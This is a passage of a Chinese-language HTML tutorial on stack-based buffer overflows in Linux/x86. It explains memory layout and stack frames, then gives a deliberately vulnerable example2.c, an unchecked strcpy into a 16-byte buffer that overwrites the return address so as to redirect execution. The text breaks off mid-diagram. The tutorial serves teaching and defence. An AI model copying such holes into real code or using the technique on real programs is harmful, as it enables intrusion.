			<DIV><FONT size=3>在过去的几个月中,被发现和利用的缓冲区溢出漏洞呈现上升趋势.例如syslog,<BR>splitvt, sendmail 8.7.5, Linux/FreeBSD mount, Xt library, at等等.本文试图<BR>解释什么是缓冲区溢出, 以及如何利用.<BR><BR>&nbsp;&nbsp;&nbsp; 汇编的基础知识是必需的. 对虚拟内存的概念, 以及使用gdb的经验是十分有益<BR>的, 但不是必需的. 我们还假定使用Intel x86 CPU, 操作系统是Linux.<BR><BR>&nbsp;&nbsp;&nbsp; 在开始之前我们给出几个基本的定义: 缓冲区,简单说来是一块连续的计算机内<BR>存区域, 可以保存相同数据类型的多个实例. C程序员通常和字缓冲区数组打交道.<BR>最常见的是字符数组. 数组, 与C语言中所有的变量一样, 可以被声明为静态或动态<BR>的. 静态变量在程序加载时定位于数据段. 动态变量在程序运行时定位于堆栈之中.<BR>溢出, 说白了就是灌满, 使内容物超过顶端, 边缘, 或边界. 我们这里只关心动态<BR>缓冲区的溢出问题, 即基于堆栈的缓冲区溢出.<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 进程的内存组织形式<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ~~~~~~~~~~~~~~~~~~~~<BR>&nbsp;&nbsp;&nbsp; 为了理解什么是堆栈缓冲区, 我们必须首先理解一个进程是以什么组织形式在<BR>内存中存在的. 进程被分成三个区域: 文本, 数据和堆栈. 我们把精力集中在堆栈<BR>区域, 但首先按照顺序简单介绍一下其他区域.<BR><BR>&nbsp;&nbsp;&nbsp; 文本区域是由程序确定的, 包括代码(指令)和只读数据. 该区域相当于可执行<BR>文件的文本段. 这个区域通常被标记为只读, 任何对其写入的操作都会导致段错误<BR>(segmentation violation).<BR><BR>&nbsp;&nbsp;&nbsp; 数据区域包含了已初始化和未初始化的数据. 静态变量储存在这个区域中. 数<BR>据区域对应可执行文件中的data-bss段. 它的大小可以用系统调用brk(2)来改变.<BR>如果bss数据的扩展或用户堆栈把可用内存消耗光了, 进程就会被阻塞住, 等待有了<BR>一块更大的内存空间之后再运行. 新内存加入到数据和堆栈段的中间.<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /------------------\&nbsp; 内存低地址<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 文本&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |------------------|<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp; (已初始化)&nbsp;&nbsp;&nbsp; |<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 数据&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp; (未初始化)&nbsp;&nbsp;&nbsp; |<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |------------------|<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 堆栈&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \------------------/&nbsp; 内存高地址<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Fig. 1 进程内存区域<BR><BR>&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 什么是堆栈?<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ~~~~~~~~~~~~~<BR><BR>&nbsp;&nbsp;&nbsp; 堆栈是一个在计算机科学中经常使用的抽象数据类型. 堆栈中的物体具有一个特性:<BR>最后一个放入堆栈中的物体总是被最先拿出来, 这个特性通常称为后进先处(LIFO)队列.<BR><BR>&nbsp;&nbsp;&nbsp; 堆栈中定义了一些操作. 两个最重要的是PUSH和POP. PUSH操作在堆栈的顶部加入一<BR>个元素. POP操作相反, 在堆栈顶部移去一个元素, 并将堆栈的大小减一.<BR><BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 为什么使用堆栈?<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ~~~~~~~~~~~~~~~~<BR>&nbsp;&nbsp;&nbsp; 现代计算机被设计成能够理解人们头脑中的高级语言. 在使用高级语言构造程序时<BR>最重要的技术是过程(procedure)和函数(function). 从这一点来看, 一个过程调用可<BR>以象跳转(jump)命令那样改变程序的控制流程, 但是与跳转不同的是, 当工作完成时,<BR>函数把控制权返回给调用之后的语句或指令. 这种高级抽象实现起来要靠堆栈的帮助.<BR><BR>&nbsp;&nbsp;&nbsp; 堆栈也用于给函数中使用的局部变量动态分配空间, 同样给函数传递参数和函数返<BR>回值也要用到堆栈.<BR><BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 堆栈区域<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ~~~~~~~~~~<BR>&nbsp;&nbsp;&nbsp; 堆栈是一块保存数据的连续内存. 一个名为堆栈指针(SP)的寄存器指向堆栈的顶部.<BR>堆栈的底部在一个固定的地址. 堆栈的大小在运行时由内核动态地调整. CPU实现指令<BR>PUSH和POP, 向堆栈中添加元素和从中移去元素.<BR><BR>&nbsp;&nbsp;&nbsp; 堆栈由逻辑堆栈帧组成. 当调用函数时逻辑堆栈帧被压入栈中, 当函数返回时逻辑<BR>堆栈帧被从栈中弹出. 堆栈帧包括函数的参数, 函数地局部变量, 以及恢复前一个堆栈<BR>帧所需要的数据, 其中包括在函数调用时指令指针(IP)的值.&nbsp;&nbsp; <BR><BR>&nbsp;&nbsp;&nbsp; 堆栈既可以向下增长(向内存低地址)也可以向上增长, 这依赖于具体的实现. 在我<BR>们的例子中, 堆栈是向下增长的. 这是很多计算机的实现方式, 包括Intel, Motorola,<BR>SPARC和MIPS处理器. 堆栈指针(SP)也是依赖于具体实现的. 它可以指向堆栈的最后地址,<BR>或者指向堆栈之后的下一个空闲可用地址. 在我们的讨论当中, SP指向堆栈的最后地址.<BR><BR>&nbsp;&nbsp;&nbsp; 除了堆栈指针(SP指向堆栈顶部的的低地址)之外, 为了使用方便还有指向帧内固定<BR>地址的指针叫做帧指针(FP). 有些文章把它叫做局部基指针(LB-local base pointer).<BR>从理论上来说, 局部变量可以用SP加偏移量来引用. 然而, 当有字被压栈和出栈后, 这<BR>些偏移量就变了. 尽管在某些情况下编译器能够跟踪栈中的字操作, 由此可以修正偏移<BR>量, 但是在某些情况下不能. 而且在所有情况下, 要引入可观的管理开销. 而且在有些<BR>机器上, 比如Intel处理器, 由SP加偏移量访问一个变量需要多条指令才能实现.<BR><BR>&nbsp;&nbsp;&nbsp; 因此, 许多编译器使用第二个寄存器, FP, 对于局部变量和函数参数都可以引用, <BR>因为它们到FP的距离不会受到PUSH和POP操作的影响. 在Intel CPU中, BP(EBP)用于这<BR>个目的. 在Motorola CPU中, 除了A7(堆栈指针SP)之外的任何地址寄存器都可以做FP.<BR>考虑到我们堆栈的增长方向, 从FP的位置开始计算, 函数参数的偏移量是正值, 而局部<BR>变量的偏移量是负值.<BR><BR>&nbsp;&nbsp;&nbsp; 当一个例程被调用时所必须做的第一件事是保存前一个FP(这样当例程退出时就可以<BR>恢复). 然后它把SP复制到FP, 创建新的FP, 把SP向前移动为局部变量保留空间. 这称为<BR>例程的序幕(prolog)工作. 当例程退出时, 堆栈必须被清除干净, 这称为例程的收尾<BR>(epilog)工作. Intel的ENTER和LEAVE指令, Motorola的LINK和UNLINK指令, 都可以用于<BR>有效地序幕和收尾工作.<BR><BR>&nbsp;&nbsp;&nbsp; 下面我们用一个简单的例子来展示堆栈的模样:<BR>&nbsp;&nbsp;&nbsp; <BR>example1.c:<BR>------------------------------------------------------------------------------<BR>void function(int a, int b, int c) {<BR>&nbsp;&nbsp; char buffer1[5];<BR>&nbsp;&nbsp; char buffer2[10];<BR>}<BR><BR>void main() {<BR>&nbsp; function(1,2,3);<BR>}<BR>------------------------------------------------------------------------------&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR> <BR>&nbsp;&nbsp;&nbsp; 为了理解程序在调用function()时都做了哪些事情, 我们使用gcc的-S选项编译, 以产<BR>生汇编代码输出:<BR><BR>$ gcc -S -o example1.s example1.c<BR><BR>&nbsp;&nbsp;&nbsp; 通过查看汇编语言输出, 我们看到对function()的调用被翻译成:<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pushl $3<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pushl $2<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pushl $1<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call function<BR>&nbsp; <BR>&nbsp;&nbsp;&nbsp; 以从后往前的顺序将function的三个参数压入栈中, 然后调用function(). 指令call<BR>会把指令指针(IP)也压入栈中. 我们把这被保存的IP称为返回地址(RET). 在函数中所做<BR>的第一件事情是例程的序幕工作:<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pushl %ebp<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl %esp,%ebp<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; subl $20,%esp<BR><BR>&nbsp;&nbsp;&nbsp; 将帧指针EBP压入栈中. 然后把当前的SP复制到EBP, 使其成为新的帧指针. 我们把这<BR>个被保存的FP叫做SFP. 接下来将SP的值减小, 为局部变量保留空间.<BR><BR>&nbsp;&nbsp;&nbsp; 我们必须牢记:内存只能以字为单位寻址. 在这里一个字是4个字节, 32位. 因此5字节<BR>的缓冲区会占用8个字节(2个字)的内存空间, 而10个字节的缓冲区会占用12个字节(3个字)<BR>的内存空间. 这就是为什么SP要减掉20的原因. 这样我们就可以想象function()被调用时<BR>堆栈的模样(每个空格代表一个字节):<BR><BR><BR>内存低地址&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 内存高地址<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; buffer2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; buffer1&nbsp;&nbsp; sfp&nbsp;&nbsp; ret&nbsp;&nbsp; a&nbsp;&nbsp;&nbsp;&nbsp; b&nbsp;&nbsp;&nbsp;&nbsp; c<BR>&lt;------&nbsp;&nbsp; [&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ][&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ][&nbsp;&nbsp;&nbsp; ][&nbsp;&nbsp;&nbsp; ][&nbsp;&nbsp;&nbsp; ][&nbsp;&nbsp;&nbsp; ][&nbsp;&nbsp;&nbsp; ]<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>堆栈顶部&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 堆栈底部<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 缓冲区溢出<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ~~~~~~~~~~~~<BR>&nbsp;&nbsp;&nbsp; 缓冲区溢出是向一个缓冲区填充超过它处理能力的数据所造成的结果. 如何利用这个<BR>经常出现的编程错误来执行任意代码呢? 让我们来看看另一个例子:<BR><BR>example2.c<BR>------------------------------------------------------------------------------<BR>void function(char *str) {<BR>&nbsp;&nbsp; char buffer[16];<BR><BR>&nbsp;&nbsp; strcpy(buffer,str);<BR>}<BR><BR>void main() {<BR>&nbsp; char large_string[256];<BR>&nbsp; int i;<BR><BR>&nbsp; for( i = 0; i &lt; 255; i++)<BR>&nbsp;&nbsp;&nbsp; large_string[i] = 'A';<BR><BR>&nbsp; function(large_string);<BR>}<BR>------------------------------------------------------------------------------<BR> <BR>&nbsp;&nbsp;&nbsp; 这个程序的函数含有一个典型的内存缓冲区编码错误. 该函数没有进行边界检查就复<BR>制提供的字符串, 错误地使用了strcpy()而没有使用strncpy(). 如果你运行这个程序就<BR>会产生段错误. 让我们看看在调用函数时堆栈的模样:<BR><BR>内存低地址&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 内存高地址<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; buffer&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sfp&nbsp;&nbsp; ret&nbsp;&nbsp; *str<BR>&lt;------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ][&nbsp;&nbsp;&nbsp; ][&nbsp;&nbsp;&nbsp; ][&nbsp;&nbsp;&nbsp; ]&nbsp;&nbsp; <BR><BR>堆栈顶部&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 堆栈底部<BR><BR>&nbsp;&nbsp;&nbsp; 这里发生了什么事? 为什么我们得到一个段错误? 答案很简单: strcpy()将*str的<BR>内容(larger_string[])复制到buffer[]里, 直到在字符串中碰到一个空字符. 显然, <BR>buffer[]比*str小很多. buffer[]只有16个字节长, 而我们却试图向里面填入256个字节<BR>的内容. 这意味着在buffer之后, 堆栈中250个字节全被覆盖. 包括SFP, RET, 甚至*str!<BR>我们已经把large_string全都填成了A. A的十六进制值为0x41. 这意味着现在的返回地<BR>址是0x41414141. 这已经在进程的地址空间之外了. 当函数返回时, 程序试图读取返回<BR>地址的下一个指令, 此时我们就得到一个段错误.<BR><BR>&nbsp;&nbsp;&nbsp; 因此缓冲区溢出允许我们更改函数的返回地址. 这样我们就可以改变程序的执行流程.<BR>现在回到第一个例子, 回忆当时堆栈的模样: <BR><BR>内存低地址&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 内存高地址<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; buffer2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; buffer1&nbsp;&nbsp; sfp&nbsp;&nbsp; ret&nbsp;&nbsp; a&nbsp;&nbsp;&nbsp;&nbsp; b&nbsp;&nbsp;&nbsp;&nbsp; c<BR>&lt;------&nbsp;&nbsp; [&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ][&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ][&nbsp;&nbsp;&nbsp; ][&nbsp;&nbsp;&nbsp; ][&nbsp;&nbsp;&nbsp; ][&nbsp;&nbsp;&nbsp; ][&nbsp;&nbsp;&nbsp; ]<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 